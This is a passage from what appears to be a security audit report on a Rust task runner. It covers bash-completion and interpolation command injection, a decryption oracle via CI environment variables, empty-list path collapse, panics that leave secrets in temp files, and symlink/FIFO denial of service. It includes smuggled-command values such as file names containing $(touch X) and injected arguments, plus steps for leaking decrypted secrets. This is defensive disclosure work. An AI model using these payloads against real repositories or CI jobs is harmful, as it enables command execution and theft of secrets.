A target's name is its .run file name with the extension stripped (runfile-discovery walk_runs, lib.rs:468). On Linux every byte except '/' and NUL is legal in a file name, so a repository can ship runfiles/$(touch X).run or runfiles/`touch X`.run. `run :complete` lists these names verbatim on stdout (completions.rs complete(), line 447 `out.extend(targets())`). The installed bash completion function _run captures that output into $out and runs `COMPREPLY+=( $(compgen -W "$out" -- "$cur") )` (completions.rs:500). The bash manual states each word of a -W wordlist is 'expanded using brace expansion, tilde expansion, parameter and variable expansion, command substitution, and arithmetic expansion' -- so the embedded $(...) / backticks run. Trigger: a user who installed completion (`run :completions install bash`) cd's into the cloned repo and presses Tab after `run ` (or `run <prefix>`); compgen expands every candidate before filtering, so any prefix triggers it. Output is discarded (2>/dev/null) so the victim sees nothing.

**Why existing controls don't stop it**

The runner's own interpolation self-quoting does not apply -- this is the generated shell script, not a $ line. The binary itself does not execute the name: `run :complete 1 run ""` only prints it (verified; no marker created). zsh/fish/powershell scripts do not have this flaw: zsh adds candidates with `compadd -- $out` (array elements are literal, not re-expanded), fish and PowerShell add literal completion candidates -- none re-evaluates the words. There is no allowlist or sanitization of target names anywhere between discovery and the completion output, and COMP_WORDBREAKS editing does not affect expansion. CI is irrelevant (interactive dev machines).

**Impact**

Arbitrary command execution as the user, triggered by a single Tab keystroke in a cloned/opened untrusted repository with no intent to run anything -- the project's #1 threat model (processing an untrusted repo). Trivially automatable and silent. Confirmed: a repo with runfiles/$(touch PWNED_dollar).run and runfiles/`touch PWNED_backtick`.run created both marker files when the real _run function was invoked as bash invokes it.

**Fix**

Do not feed attacker-controlled names through `compgen -W`. Pass candidates to compgen as literal data, e.g. read the binary's output into a bash array with `mapfile -t out < <(run :complete ...)` and use `compgen -W` only on a safe fixed list, filtering the target names in the function with a prefix test instead of word expansion; or print one candidate per line and use `COMPREPLY=( "${out[@]}" )` with manual prefix filtering, never re-expanding. As defense in depth, reject or escape control/shell-metacharacter target names at discovery. The same literal-array approach should replace the inner `$(compgen -d/-f -- "$cur")` only after the wordlist expansion is removed.

**⚠ Product impact**

*Type:* `behavior`

Completion candidate handling changes; target names containing shell metacharacters would now complete literally (filtered by prefix) instead of being expanded. No legitimate target name relies on expansion, so normal completion is unchanged.

*Safer rollout:* Ship the fixed bash script; users re-run `run :completions install bash` (the installed hook calls `run :completions output bash` live for zsh/pwsh, but bash writes a static file, so bash users must reinstall or the file must be regenerated).

**Regression test**

`crates/runfile-cli/tests/security_regression.rs` — status: `failed against 1.8.2; passes after the fix`

Run: `run test -- --test security_regression -- --ignored pressing_tab`

Observed failure: security_regression_pressing_tab_does_not_run_a_command_spelled_in_a_file_name: panicked at security_regression.rs:114: pressing Tab after `run` ran the command spelled in a target's file name (same for the backtick variant at :126)

Passes once the fix is applied.

**References**

- https://www.gnu.org/software/bash/manual/html_node/Programmable-Completion.html — bash manual: each -W word is expanded with brace, tilde, parameter, command substitution and arithmetic expansion (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/78.html — CWE-78 OS Command Injection (retrieved 2026-10-03)

---

#### SA-003: Self-quoted interpolation is executed as shell code inside double-quotes and heredoc bodies ($ lines / exec shell bodies)

**Severity:** High | **Confidence:** Confirmed | **Category:** injection | **CWE-78** | **Component:** `crates/runfile-lang`

**Location**

`crates/runfile-lang/src/value.rs:101-129`

```rust
pub fn to_shell(&self) -> String {
		match self {
			Value::List(items) => items.iter().map(Value::to_shell)...join(" "),
			other => shell_quote(&other.to_string()),
		}
	}
...
pub fn shell_quote(s: &str) -> String { ... out.push('\''); ... }
```

`crates/runfile-lang/src/eval.rs:560-569`

```rust
pub fn interpolate_shell(parts: &[InterpPart], sc: &mut Scope) -> Result<String, EvalError> {
	for p in parts { match p {
		InterpPart::Literal(t) => out.push_str(t),
		InterpPart::Expr(e) => out.push_str(&eval_boundary(e, sc)?.to_shell()),
	}}}
```

**Attack path**

The core safety promise is that an interpolated value becomes exactly one inert shell word. `to_shell`/`shell_quote` deliver that with POSIX single-quoting, which is inert ONLY in an unquoted shell context. `interpolate_shell` renders each interpolation independently and has no knowledge of the surrounding shell-quote state in the adjacent literal parts. When an author writes an interpolation inside a double-quoted word or an unquoted heredoc body, the emitted single-quotes become literal characters and the shell still performs $(...), backtick and $VAR expansion on the value's bytes. A value supplied as data (ARG/ARGS from a CI branch name, PR title or tag; ENV; captured output; a glob/json_query result) that contains `$(cmd)` or backticks is therefore executed by the local shell. Reproduced on the HEAD debug binary: target `$ echo "v={{ ARG.v }}"` run with `--v='$(touch MARKER)'` renders `echo "v='$(touch MARKER)'"` and the MARKER file was created; same for `ssh host "cd {{ ARG.dir }} && make"` (payload ran locally before ssh), for `$ echo "export X={{ ARG.v }}" >> rc` (the documented-correct rc pattern), and inside an unquoted heredoc `$ cat <<EOF / name='{{ ARG.v }}' / EOF` (value `$(echo SUBST-RAN)` expanded to SUBST-RAN). An `exec bash` heredoc body behaves the same. By contrast an interpolation inside $(...)/backticks IS protected because those start a fresh parse where single-quotes are honoured again, so the leak is specific to the top-level double-quote and heredoc contexts.

**Why existing controls don't stop it**

The runfile-shell checker is the only safety net, and it deliberately EXEMPTS exactly these cases: SHELL-CHECK-RULES.md 'quoted-interpolation' reports a double-quoted interpolation 'only where no shell reads the word again' and lists ssh/sh -c/echo-into-rc/message patterns as 'not flagged' (rules.rs quoted_interpolation, `judged` is true only for Program/Redirect/Plain/unpaired-Test positions). README 'Interpolation quotes itself' states the value 'already did it'. So the patterns that leak are the ones both the docs and the linter actively bless; no suppression, no runtime escaping, no context-aware rendering exists. The value never passes through number()/validation on this path. `--dry-run` shows the rendered command but still does not execute, so it does not mitigate a real run.

**Impact**

Arbitrary local command execution driven by data (not repo code) whenever a runfile author follows a documented-correct double-quoted or heredoc interpolation pattern and the interpolated value is attacker-influenced (CI branch/tag/PR-title -> ARG/ENV, a checked-out file name via glob, captured command output). This defeats the language's central injection-safety guarantee for those contexts. On a CI runner the executed code runs with the job's privileges and secrets (e.g. RUNFILE_PRIVATE_KEYS, decrypted .env values exported into the child env).

**Fix**

Close the gap at one of two layers. (1) Preferred, in runfile-shell: flag EVERY double-quoted and heredoc-embedded interpolation (drop the 'no shell reads the word again' exemption, or at least require the value be validated), because single-quote self-quoting is never real quoting inside double quotes. (2) Or make rendering context-aware in interpolate_shell: track the shell-quote state across the literal parts of the line and emit double-quote-safe escaping (backslash-escape $ ` " \) when the interpolation sits inside double quotes, and refuse/escape inside a heredoc. Also update README and SHELL-CHECK-RULES.md, which currently teach the unsafe patterns as correct.

**⚠ Product impact**

*Type:* `behavior`

Tightening the checker turns today's 'correct' ssh/sh -c/echo-into-rc patterns into lint errors, so existing runfiles using them stop passing `run :lint` and refuse to run until rewritten (e.g. pass the value through a validated variable or send it to the remote shell via stdin). Context-aware rendering instead changes the bytes some double-quoted commands receive.

*Safer rollout:* Ship the stricter check in a warn/log-only mode first, provide the rewrite in the error's fix line, and document that values crossing into a nested shell must be validated or passed out-of-band.

**Regression test**

`crates/runfile-cli/tests/security_regression.rs` — status: `failed against 1.8.2; passes after the fix`

Run: `run test -- --test security_regression -- --ignored does_not_run_its_value`

Observed failure: 3 tests fail on their assertion: double quotes (`a value interpolated inside double quotes was run as a command: Deploying ''`), `sh -c "cd {{ ARG.dir }} && true"` (`the value was expanded by the local shell`), and an `exec bash` heredoc (`... run as a command: name=''`)

Passes once the fix is applied.

**References**

- https://www.gnu.org/software/bash/manual/bash.html#Double-Quotes — Bash: within double quotes $, ` and \ retain special meaning; single quotes do not quote (retrieved 2026-10-03)
- https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html — POSIX shell: here-document (unquoted delimiter) performs parameter and command substitution on the body (retrieved 2026-10-03)

---

### Medium

#### SA-004: Decryption oracle: an `encrypted:` value arriving through the caller's environment or a `.env.X = ARG.x` assignment is decrypted with the run's private keys and handed to commands in plaintext

**Severity:** Medium | **Confidence:** Confirmed | **Category:** crypto | **CWE-441** | **Component:** `crates/runfile-env`

**Location**

`crates/runfile-env/src/lib.rs:220-232`

```rust
let base = match params.base_env {
	Some(base) => base,
	None => {
		process = env::vars().collect();
		&process
	}
};
let mut env_map: HashMap<String, String> = params.defaults.cloned().unwrap_or_default();
env_map.extend(base.iter().map(|(k, v)| (k.clone(), v.clone())));
```

`crates/runfile-env/src/lib.rs:255-258`

```rust
if runfile_crypto::has_encrypted_values(&env_map) {
	let key_hex = resolve_decryption_key(&env_map, params.available_private_keys)?;
	runfile_crypto::decrypt_env_values(&mut env_map, &key_hex)...
```

`crates/runfile-env/src/lib.rs:264-276`

```rust
overlay_base(&mut env_map, base);
...
for (key, raw) in env_vars {
	let resolved = substitute(raw, &env_map).map_err(EnvError::Substitution)?;
	env_map.insert(key.clone(), resolved);
}
```

`crates/runfile-env/src/lib.rs:282-288`

```rust
// Final decrypt pass: if the env block (or shell overlay) somehow
// introduced an `encrypted:...` value ...
if runfile_crypto::has_encrypted_values(&env_map) {
	let key_hex = resolve_decryption_key(&env_map, params.available_private_keys)?;
	runfile_crypto::decrypt_env_values(&mut env_map, &key_hex)...
```

`crates/runfile-crypto/src/lib.rs:126-145`

```rust
pub fn decrypt_env_values(env: &mut HashMap<String, String>, key_hex: &str) -> Result<(), CryptoError> {
	let keys_to_decrypt: Vec<String> = env
		.iter()
		.filter(|(_, v)| is_encrypted(v))
```

`crates/runfile-runtime/src/env.rs:148-159`

```rust
let params = EnvBuildParams {
	env_files: Some(&props.env_files),
	env: Some(&env),
	...
	base_env: inherited.map(|i| &i.exported),
	defaults: inherited.map(|i| &i.defaults),
};
build_env(&params, ...)
```

`crates/runfile-runtime/src/run.rs:300-305`

```rust
pub fn run_target_with(target: &Target, base: Props, r: &mut Runner<'_>) -> Result<(), RunError> {
	let props = base.extend(&target.body, &mut r.scope, false)?;
	// Env before the body: `.env-file` has to be readable by `{{ ENV.x }}`.
	build_env(&props, r)?;
```

**Attack path**

Source: any environment variable or argument whose text an outsider controls. In CI that is exactly GitHub's recommended script-injection mitigation, `env: PR_TITLE: ${{ github.event.pull_request.title }}` (likewise issue titles/comments, commit messages, workflow_dispatch inputs), or a target that copies an argument into its environment (`.env.LABEL = ARG.label`). Ciphertext: encrypted .env files are designed to be committed (README: 'so the file stays readable and diffable'), so any reader of the repository can copy `DB_PASSWORD=encrypted:...`. Steps: (1) the attacker sets a PR/issue title to `encrypted:<ciphertext of DB_PASSWORD>`; (2) a workflow that has the key (setup action `secret-keys` -> RUNFILE_PRIVATE_KEYS in GITHUB_ENV) runs a target; (3) every target goes run_target_with -> env::for_props -> runfile_env::build_env with base_env None = std::env::vars() (lib.rs:220-232); the first pass (255-258) scans the WHOLE merged map, process environment included, for the `encrypted:` prefix, takes the key named by RUNFILE_ENCRYPTION_PUBLIC_KEY (from the target's own .env-file, or exported) and decrypt_env_values rewrites PR_TITLE; overlay_base (264) restores the ciphertext, and the final pass (282-288) decrypts it again, and also decrypts `.env.X` values substituted from ARG/ENV (271-276); (4) `$PR_TITLE` and `{{ ENV.PR_TITLE }}` now hold the plaintext of DB_PASSWORD (no AAD binds a ciphertext to its name, see the separate finding), and any reflection -- an echo into a public job log, a PR comment, a chat notification, a commit-status description -- discloses it. Reproduced on the HEAD debug binary with a key generated for the test (RUNFILE_PRIVATE_KEYS; keyutils syscalls blocked by strace error injection): target `.env-file = ".env"` + `$ echo "Building PR: $PR_TITLE"`, run with PR_TITLE=<the DB_PASSWORD ciphertext copied from .env>, printed `Building PR: TOPSECRET-db-pass-123`; `.env.LABEL = ARG.label` with `--label=<ciphertext>` printed the plaintext via both `$LABEL` and `{{ ENV.LABEL }}`; a target with no .env-file decrypted `MSG=<ciphertext>` once RUNFILE_ENCRYPTION_PUBLIC_KEY was exported.

**Why existing controls don't stop it**

A public-key match is required, but the public key sits in the same committed file the ciphertext came from (or is exported), and the pool is whatever keys the job holds. GCM authenticity does not help: the ciphertext is genuine. There is no AAD and no record of where a value came from, so decrypt_env_values cannot tell a file value from an inherited or substituted one. GitHub log masking covers registered secrets and ::add-mask:: values only; a runfile-decrypted plaintext is neither. Fork `pull_request` runs get no secrets (GitHub docs), so that one trigger fails closed (with an error); pull_request_target, issues, issue_comment, push (commit messages of merged PRs) and workflow_dispatch do have them. `:env inject` is not affected (it decrypts file values only and the parent environment wins). Deliberate in part: the comments at lib.rs:250-254 and 282-284 say shell-supplied encrypted values are meant to be decrypted; the risk is that this turns every data-carrying variable into a decryption request.

**Impact**

Anyone who can put text into a variable a CI job exposes obtains the plaintext of any value in the project's committed encrypted .env files encrypted under the job's key, as soon as the job reflects that variable anywhere they can read. Preconditions sit in the consumer's workflow: it holds the key, passes untrusted text through env or ARG->.env in a target that resolves a public key, and reflects the value. Remote and unauthenticated, severe impact, meaningful preconditions: medium.

**Fix**

Decrypt only what a file supplied: in build_env, decrypt `file_vars` (resolving the public key against env_map) before `env_map.extend(file_vars)`, keep `defaults` as handed over (already plain), and delete the process-environment decryption and the final pass (lib.rs:255-258 becomes a pass over file_vars; 282-288 go). If decrypting an exported value must stay supported, make it opt-in per variable name, and bind ciphertexts to their names with AAD (separate finding) so a DB_PASSWORD ciphertext no longer decrypts as PR_TITLE.

**⚠ Product impact**

*Type:* `behavior`

An `encrypted:` value exported in the caller's shell, or written as a `.env.X = "encrypted:..."` literal, would no longer be decrypted. tests/encryption.rs (build_env_decrypts_via_public_key_matching and the two error tests) pass encrypted values through `env` and would change.

*Safer rollout:* Keep decrypting `.env.X` values that are string literals written in the file (not interpolated), if anyone uses that; release-note the change for anyone who exports encrypted values from CI.

**References**

- https://docs.github.com/en/actions/reference/security/secure-use — GitHub recommends passing untrusted input (e.g. github.event.pull_request.title) through an intermediate environment variable (retrieved 2026-10-03)
- https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows — secrets are not passed to fork-triggered pull_request runs; pull_request_target has access to secrets (retrieved 2026-10-03)
- https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands — masking applies to values registered with add-mask (and secrets) (retrieved 2026-10-03)

---

#### SA-005: Empty list interpolation silently collapses adjacent literal text (e.g. `rm -rf {{ dirs }}/cache` -> `rm -rf /cache`)

**Severity:** Medium | **Confidence:** Confirmed | **Category:** data-loss | **CWE-170** | **Component:** `crates/runfile-lang`

**Location**

`crates/runfile-lang/src/value.rs:101-106`

```rust
pub fn to_shell(&self) -> String {
		match self {
			Value::List(items) => items.iter().map(Value::to_shell).collect::<Vec<_>>().join(" "),
			other => shell_quote(&other.to_string()),
		}
	}
```

`crates/runfile-lang/src/eval.rs:560-569`

```rust
InterpPart::Expr(e) => out.push_str(&eval_boundary(e, sc)?.to_shell()),
```

**Attack path**

A list interpolation renders as the space-join of its elements' quoted forms, so an EMPTY list renders to the empty string with no word at all. When the interpolation is glued to adjacent literal text in a `$` line, the literal survives on its own. Reproduced on HEAD: target with `let none = without(split(ARG.v, ","), "a", "b", "")` then `$ echo rm -rf {{ none }}/cache`; with every element filtered out the line rendered and ran as `rm -rf /cache` (confirmed with echo standing in for rm; `{{ none }}` produced nothing and `/cache` remained). Values feeding such lists are commonly data (`glob()` results, `split()` of captured output or ARG) that can legitimately be empty.

**Why existing controls don't stop it**

No runtime guard: an empty list is a valid value and to_shell has no special case for 'adjacent to a literal'. The shell checker does not model list cardinality. `length()` guards exist in the language but are the author's to remember; nothing warns that an empty list glued to a path yields an absolute/unintended path. Unlike POSIX `"$@"`, there is no notion of a word that disappears vs. an empty word here.

**Impact**

A data-driven empty list turns a path like `{{ dirs }}/cache` into `/cache`, or an argument like `--root={{ dirs }}` into `--root=`, changing which path a destructive or mutating command targets. With `rm`/`find -delete`/`tar` and an absolute suffix this is silent data loss on an unintended target; more often it is a confusing wrong-path failure.

**Fix**

Document the adjacency/empty-list behaviour prominently and, better, have the checker flag a list interpolation glued to leading/trailing literal path text in a destructive command, or treat a list glued to a literal as needing a non-empty guard. At minimum add a note to glob()/split() docs that an empty result collapses adjacent text.

**Product impact:** none — internal change only.

**References**

- https://cwe.mitre.org/data/definitions/170.html — CWE-170 Improper Null/empty handling (retrieved 2026-10-03)

---

#### SA-006: Built-ins panic on data-driven numbers -- `sleep()` with a huge value, `slice()` with a huge length -- aborting the run before temp-file cleanup

**Severity:** Medium | **Confidence:** Confirmed | **Category:** dos | **CWE-248** | **Component:** `crates/runfile-lang`

**Location**

`crates/runfile-lang/src/functions.rs:1632-1644`

```rust
"sleep" if n == 1 => (|| {
	let secs = v[0].as_num()...;
	if secs < 0.0 || !secs.is_finite() { return Err(...); }
	if !sc.dry_run { std::thread::sleep(std::time::Duration::from_secs_f64(secs)); }
	Ok(V::Str(String::new()))
})(),
```

`crates/runfile-runtime/src/run.rs:600-601`

```rust
if attempt + 1 < n && secs > 0.0 && !r.dry_run {
	std::thread::sleep(std::time::Duration::from_secs_f64(secs));
}
```

`crates/runfile-cli/src/main.rs:305-307`

```rust
let outcome = host.run(&first, &args);
	// However it ended...
	host.cleanup_temps();
```

`crates/runfile-lang/src/functions.rs:508-519`

```rust
"slice" => {
	let items = list(0)?;
	let start = (num(1)?.max(0.0) as usize).min(items.len());
	let end = match n {
		3 => (start + num(2)?.max(0.0) as usize).min(items.len()),
		_ => items.len(),
	};
	Value::List(items[start..end].to_vec())
}
```

**Attack path**

The sleep() guard rejects negative and non-finite values but not a huge FINITE one. `Duration::from_secs_f64` panics when the value overflows Duration (anything beyond ~1.8e19 seconds). Reproduced on HEAD: `sleep(number(ARG.secs))` with `--secs=1e300` panics with 'cannot convert float seconds to Duration' and exits 101. seconds is frequently data: `sleep(number(ARG.delay))`, `sleep(json_get(cfg,"wait"))`, `sleep(number(ENV.BACKOFF))`. The `retry n every {{ ... }}` delay path (run.rs:600) has the same `from_secs_f64` reached after `.max(0.0)` with no overflow check. Critically, runfile has no catch_unwind and the release profile does not set panic=abort, so the panic unwinds straight past `host.cleanup_temps()` in main.rs (only called on the normal return path and in the watch loop). I reproduced the consequence: a target that does `let s = temp_file("TOP-SECRET-PLAINTEXT","txt")` and then `sleep(1e300)` left the temp file on disk after the panic, still containing the plaintext.

[Also reported by `lang-eval`] The length argument is cast `num(2)?.max(0.0) as usize`. Rust's float->int cast saturates, so a large finite length (e.g. 1e20 or 1e308) becomes usize::MAX, and `start + usize::MAX` is computed with no checked/saturating arithmetic. The `length` is frequently data: `slice(xs, 1, number(ARG.n))`, `slice(list, 1, json_get(cfg, "take"))`, `slice(parts, 0, number(ENV.COUNT))`. Reproduced on the HEAD debug binary: a target `let xs=["a","b","c"]` then `print(slice(xs, 1, number(ARG.n)))` run with `--n=1e20` aborts with `attempt to add with overflow` at functions.rs:515, exit 101. In a release build (Cargo.toml profile.release sets no `overflow-checks`, so they are off) the add wraps instead of panicking: `start + usize::MAX` wraps to `start-1`, then `.min(len)` yields an `end` below `start`, so `items[start..end]` panics with `slice index starts at N but ends at N-1` -- the shipped binary still aborts, just one line later. slice is a pure function, so it is evaluated anywhere an expression is, including under `--dry-run` and in a `_shared.run` `let`.

**Why existing controls don't stop it**

No panic hook, no catch_unwind, no panic=abort (Cargo.toml profile.release). TempFiles is an Arc<Mutex<Vec<PathBuf>>> with no Drop that deletes; cleanup_temps is explicit and runs only after host.run RETURNS. Ctrl+C is handled by an interrupt flag checked between statements (so that path does clean up), but an unwinding panic is not Ctrl+C and skips cleanup entirely. The documented pattern `.env.GOOGLE_APPLICATION_CREDENTIALS = temp_file(base64_decode(ENV.SA_JSON), "json")` and `decrypt(...)` put plaintext secrets in exactly these temp files.

[Also reported by `lang-eval`] `num(1)` (start) is clamped with `.min(items.len())`, but `num(2)` (length) is only `.max(0.0)` before the saturating cast and the unchecked `start + ...`; nothing bounds it the way `range`/`repeat`/`count` bound their arguments (those return a clean error above a limit). The language has no catch_unwind, no panic hook, and the release profile does not set panic=abort, so the panic unwinds straight past `host.cleanup_temps()` in main.rs -- the same path the existing sleep() finding documents -- leaving any `temp_file()`/`temp_dir()`/`decrypt()` output (the sanctioned place for decoded credentials) on disk. Reproduced: a target doing `temp_file("PLAINTEXT-SECRET","txt")` then `slice([1,2],1,number(ARG.n))` with `--n=1e300` left `runfile-<pid>-0-<nanos>.txt` with its plaintext in the OS temp directory after the abort.

**Impact**

Two effects. (1) Availability: a data-driven sleep/retry-delay value crashes the run (process abort, exit 101) instead of erroring cleanly. (2) Confidentiality: because the panic skips cleanup_temps, any temp_file()/temp_dir() created earlier in the run — the sanctioned place for decrypted credentials and service-account JSON — is left behind in the OS temp directory (world-readable location, predictable `runfile-<pid>-<n>-<nanos>` names) after the process dies. On a shared or CI host those plaintext secrets persist past the run.

[Also reported by `lang-eval`] Availability: a data-driven slice length aborts the run (process exit 101 / SIGABRT) instead of erroring cleanly -- in both debug and release builds. Confidentiality (secondary, same mechanism as the sleep finding and the runtime temp-survival finding): the abort skips temp-file cleanup, so decrypted secrets written to temp_file()/temp_dir() earlier in the run persist in the predictable-named, world-reachable OS temp directory after the process dies.

**Fix**

In functions.rs reject a sleep value that does not fit a Duration before calling from_secs_f64 (e.g. `if !secs.is_finite() || secs < 0.0 || secs > Duration::MAX.as_secs_f64()` -> error), and apply the same bound to the retry `every` delay in run.rs:600. Independently, make temp-file cleanup panic-safe: drain Scope.temps from a Drop guard / scope-guard around host.run, or wrap the run in catch_unwind and clean up before re-raising, so no panic leaves decrypted secrets on disk.

[Also reported by `lang-eval`] Bound the length the way `count()`/`range()` already do before using it: reject a non-finite or out-of-range length with a clean error, and compute `end` with saturating arithmetic, e.g. `let len = num(2)?; if len < 0.0 || !len.is_finite() { return Err(..) } let end = start.saturating_add(len as usize).min(items.len());`. Independently, the panic-safe temp cleanup recommended in the sleep() finding (Drop guard / catch_unwind around host.run) would remove the confidentiality consequence for this and any other panic.

**⚠ Product impact**

*Type:* `behavior`

A sleep/retry-delay value that previously crashed now returns a clean error; runfiles relying on the crash (none sensible) are unaffected. Panic-safe cleanup only removes files that should already have been removed.

*Safer rollout:* None needed beyond the fix; both changes only tighten failure handling.

**References**

- https://doc.rust-lang.org/std/time/struct.Duration.html#method.from_secs_f64 — from_secs_f64 panics if the value is negative, overflows Duration, or is not finite (retrieved 2026-10-03)
- https://doc.rust-lang.org/reference/expressions/operator-expr.html#numeric-cast — Rust: float-to-int `as` casts saturate (a value larger than the max becomes the max) (retrieved 2026-10-03)
- https://doc.rust-lang.org/cargo/reference/profiles.html#overflow-checks — overflow-checks default to off in the release profile, so `a + b` wraps there (retrieved 2026-10-03)

*Reported independently by 2 agents: lang-eval.*

---

#### SA-007: Discovery follows symlinks and reads non-regular files without limit: a symlink loop, a `.run` symlinked to /dev/zero, or a FIFO exhausts memory or hangs `run :list`, Tab completion, `--help`, `:lint` and the editor

**Severity:** Medium | **Confidence:** Confirmed | **Category:** dos | **CWE-674** | **Component:** `crates/runfile-discovery`

**Location**

`crates/runfile-discovery/src/lib.rs:445-451`

```rust
let Ok(rd) = std::fs::read_dir(dir) else { return Ok(()) };
	let mut entries: Vec<_> = rd.flatten().map(|e| e.path()).collect();
	entries.sort();
	for p in entries {
		if p.is_dir() {
			walk_runs(root, &p, anchor, prefix, origin, reach, cat)?;
			continue;
		}
```

`crates/runfile-discovery/src/lib.rs:373-396`

```rust
fn scan_subprojects(root: &Path, depth: usize, cat: &mut Catalog) -> Result<(), DiscoverError> {
	if depth > MAX_DEPTH {
		return Ok(());
	}
	... if !p.is_dir() { continue; }  // subproject walk IS depth-capped; walk_runs is NOT
```

`crates/runfile-cli/src/list.rs:25-28`

```rust
pub(crate) fn facts(t: &Target) -> Facts {
	let Ok(src) = std::fs::read_to_string(&t.path) else {
		return Facts::none();
	};
```

`crates/runfile-discovery/src/lib.rs:125-128`

```rust
fn scope_of(path: &Path) -> Result<Vec<String>, DiscoverError> {
	let Ok(src) = std::fs::read_to_string(path) else {
		return Ok(Vec::new());
	};
```

`crates/runfile-cli/src/target_help.rs:32-48`

```rust
std::fs::read_to_string(p) ... let src = std::fs::read_to_string(&target.path).unwrap_or_default();
```

`crates/runfile-cli/src/cmd_lint.rs:161-186`

```rust
let read = |p: &Path| std::fs::read_to_string(p).ok(); ... let src = match std::fs::read_to_string(file) {
```

`crates/runfile-lsp/src/server.rs:221-226`

```rust
fn text_of(&self, path: &Path) -> Option<String> {
		match self.docs.get(&path_to_uri(path)) {
			Some(open) => Some(open.clone()),
			None => std::fs::read_to_string(path).ok(),
```

`crates/runfile-runtime/src/dispatch.rs:487`

```rust
let src = std::fs::read_to_string(p).map_err(|e| { ...  // parse_file, reached by run/--dry-run/header probe
```

`crates/runfile-cli/src/list.rs:25-31`

```rust
pub(crate) fn facts(t: &Target) -> Facts {
	let Ok(src) = std::fs::read_to_string(&t.path) else {
		return Facts::none();
	};
```

`crates/runfile-discovery/src/lib.rs:453-457`

```rust
if p.extension().is_none_or(|x| x != "run") {
			continue;
		}
		if p.file_name().is_some_and(|n| n == SHARED) {
			continue;
		}
```

**Attack path**

walk_runs recurses into every entry for which p.is_dir() is true. p.is_dir() FOLLOWS symlinks, and walk_runs keeps no visited-inode set and has no depth cap (unlike scan_subprojects, which is bounded by MAX_DEPTH=3). A repository ships a runfiles/ containing one or more directory symlinks pointing back into the tree -- git stores symlinks as mode 120000, so `runfiles/a -> .` and `runfiles/b -> .` travel in a clone. Each level of recursion appends `/a` or `/b` to the path and reads the same directory again, discovering the symlinks again. With a SINGLE self-symlink the path grows one component per level and the walk terminates when the path exceeds the OS PATH_MAX and read_dir fails (reproduced: `runfiles/a -> .` yields 42 targets, like a:build, a:a:build, ... and returns). With TWO self-symlinks the directory set BRANCHES by two at every level, so ~2^(PATH_MAX/2) directories are visited before any path is long enough to fail -- an exponential blowup. Every read-only, documented-safe entry point calls discovery before running anything: (1) `run :list` / `--json` / `--names`; (2) `run :complete` on every shell Tab; (3) `run <t> --help`; (4) `run :lint`; (5) the language server on file open; (6) the VS Code extension, which runs `run :list --json` automatically on onStartupFinished for every workspace folder, so merely opening the hostile folder triggers it with no user action.

[Also reported by `untrusted-repo`] A malicious repository ships runfiles/ containing a file whose name ends in .run (or a _shared.run) that is actually a git-storable symlink (git stores symlinks as mode 120000) pointing at an infinite or very large file -- e.g. `runfiles/build.run -> /dev/zero` -- or a FIFO / blocking device. runfile-discovery::walk_runs() classifies the entry by extension only (p.extension()=="run"), following the symlink via p.is_dir()/metadata, and registers it as a Target. Every read-only, 'must-not-execute' entry point then reads the whole file into a String with std::fs::read_to_string and NO size bound: (1) `run :list` / `:list --json` / `:list --names` -> list::facts() reads each target (list.rs:26); (2) `run :complete <cword> <words>` fired on EVERY shell Tab press -> main.rs :complete -> list::names() -> facts() -> same read; (3) the VS Code extension runs `run :list --json` automatically on `onStartupFinished` in every workspace folder (editors/vscode/package.json activationEvents + catalogCommand default, spawned in extension.ts), so merely OPENING the repo folder triggers it with no user action; (4) `run <target> --help` -> target_help::inputs()/render() (target_help.rs:32,48); (5) `run :lint` -> cmd_lint reads every file (cmd_lint.rs:161,186); (6) the language server (`run :lsp`) reads the _shared.run chain from disk via server.rs text_of (server.rs:223); (7) the scoped machine-wide walk reads each _shared.run and .run via discovery::scope_of (lib.rs:126). For /dev/zero the String grows without limit until the process is OOM-killed; for a FIFO/blocking device the read blocks forever.

[Also reported by `cli`] Discovery collects any filesystem entry with a `.run` extension as a target (walk_runs checks only the extension and the SHARED name; it does not require a regular file). A repository can ship a named pipe (FIFO) `runfiles/x.run`. When list::facts() later calls std::fs::read_to_string on it (from `run :list`, `run :generate`, and `run :complete` -- the function the installed shell completion calls on every Tab), the read blocks forever waiting for a writer that never arrives. Verified: `run --dir <repo> :list` and `run --dir <repo> :complete 1 run ""` both hit a 5-second timeout (exit 124) with the FIFO present.

**Why existing controls don't stop it**

No symlink guard: walk_runs classifies an entry with p.is_dir() (lib.rs:449), which follows symlinks; it never calls symlink_metadata and keeps no visited set. No depth cap on walk_runs -- the MAX_DEPTH=3 cap and the SKIP list (node_modules/target/.git/...) live only in scan_subprojects (lib.rs:374,386), the OUTER walk looking for */runfiles/, not in the per-runfiles/ walk. The only incidental bound is PATH_MAX, which stops the LINEAR single-symlink case but not the EXPONENTIAL multi-symlink one. The prepare gate does not apply (listing/completion/help/lint/the VS Code catalog/the LSP all run before or without it). CI suppresses only the machine-wide home dir; the local walk of the untrusted repo always runs. Distinct from the two existing untrusted-repo findings: the read_to_string DoS is about one file's byte size, and the cli FIFO finding is a blocking read -- this is the directory WALK exploding, independent of any file's contents.

[Also reported by `untrusted-repo`] No size cap anywhere on these reads -- read_to_string reads to EOF. No symlink/file-type guard in walk_runs: entries are classified by `.run` extension and is_dir() only (crates/runfile-discovery/src/lib.rs:448-456), never by is_file()/symlink_metadata, so a symlink, FIFO or device named *.run is accepted as a target. Discovery runs in CI with home=None but the LOCAL walk-up (the untrusted repo) is always walked. The prepare gate does NOT protect these paths: --help, :list, :complete, :lint and the VS Code catalog/LSP all run before or without the gate (main.rs runs target_help before prepare::enforce; :list/:complete/:lint never call it). There is no per-file timeout. The only incidental limit is the OS (OOM killer / available memory).

[Also reported by `cli`] No file-type check before reading: discovery filters on extension only, and facts()/shape() read with read_to_string unconditionally. No read timeout. The hang is interruptible with Ctrl+C but a Tab press that freezes the shell until Ctrl+C is a real nuisance DoS, and `run :list` in an untrusted repo is a documented 'safe to run' inspection command.

**Impact**

Zero-to-one-click memory-exhaustion / hang that executes none of the repo's code and needs no `run`. Reproduced on the HEAD debug binary under a 4 GB address-space ulimit: `runfiles/a -> .` plus `runfiles/b -> .`, then `run --dir <repo> :list` (and `:complete 1 run ""`) was OOM-killed (SIGKILL, rc=137) within the 20 s timeout; the single-symlink control returned 42 names and exited 0. Via the VS Code path this is a folder-open DoS: cloning/opening a hostile repo exhausts the developer's RAM and can take the whole editor session down with it (the same blast radius as the existing read_to_string finding).

